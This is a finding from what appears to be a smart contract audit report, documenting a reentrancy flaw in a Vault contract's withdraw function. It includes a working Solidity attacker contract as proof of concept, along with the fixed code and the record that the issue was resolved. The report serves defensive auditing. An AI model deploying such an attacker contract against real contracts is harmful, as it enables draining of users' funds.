### 3.1 Critical Findings

#### [C-01] Reentrancy in withdraw() allows fund theft

**Severity:** Critical
**Status:** Resolved
**Location:** contracts/Vault.sol:L45-L52

**Description:**
The withdraw() function updates the user's balance after making an external
call, violating the Checks-Effects-Interactions pattern.

**Proof of Concept:**
```solidity
contract Attacker {
    Vault public vault;

    constructor(address _vault) {
        vault = Vault(_vault);
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw(msg.value);
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw(1 ether);
        }
    }
}
```

**Impact:**
An attacker can drain all funds from the contract.

**Recommendation:**
Update state before external calls or use ReentrancyGuard:

```solidity
function withdraw(uint256 amount) external nonReentrant {
    require(balances[msg.sender] >= amount, "Insufficient");
    balances[msg.sender] -= amount; // Update first
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
}
```

**Team Response:**
Fixed in commit abc123. Added ReentrancyGuard and CEI pattern.

**Auditor Verification:**
Verified fix in re-audit. Issue resolved.
